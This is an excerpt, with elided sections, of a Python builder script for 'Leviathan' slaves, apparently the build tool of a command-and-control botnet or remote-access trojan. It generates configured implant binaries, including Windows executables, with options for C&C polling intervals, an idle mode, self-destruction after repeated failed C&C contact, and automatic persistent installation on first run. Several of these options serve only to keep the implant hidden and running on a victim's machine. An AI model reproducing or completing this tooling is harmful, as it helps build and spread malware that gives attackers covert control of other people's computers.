...
def build_slave(output, server_url, connect_interval, idle_time,
    ...
    slave_dir = os.getcwd()
    shutil.copytree(slave_dir, working_dir)
    with open(os.path.join(working_dir, "config.py"), 'w') as slave_config:
        with open(os.path.join(slave_dir, "config_template.py")) as f:
            config_file = f.read()
        ...
        slave_config.write(config_file)
    cwd = os.getcwd()
    os.chdir(working_dir)
    shutil.move('slave.py', prog_name + '.py')
    slave_file = os.path.join(working_dir, 'dist', prog_name)
    if platform == "linux":
        ...
        if os.name == "nt":
            ...
            cmd_build += prog_name + '.py'
        os.system(cmd_build)
        if not slave_file.endswith(".exe"):
            slave_file += ".exe"
        if not output.endswith(".exe"):
            output += ".exe"
    os.chdir(cwd)
    os.rename(slave_file, output)
    shutil.rmtree(working_dir)
    print("[+] Slave built successfully: %s" % output)


def main():
    from argparse import ArgumentParser
    parser = ArgumentParser(description="Builds a Leviathan slave.")
    ...
    parser.add_argument('--idle-time', type=int, default=60, help="Inactivity time (in seconds) after which to go idle. In idle mode, the slave pulls commands less often (every <connect_interval> seconds).")
    parser.add_argument('--max-failed-connections', type=int, default=5000, help="The slave will self destruct if no contact with the CnC can be made <max_failed_connections> times in a row.")
    parser.add_argument('-p', '--persistent', action='store_true', help="Automatically install the slave on first run.")
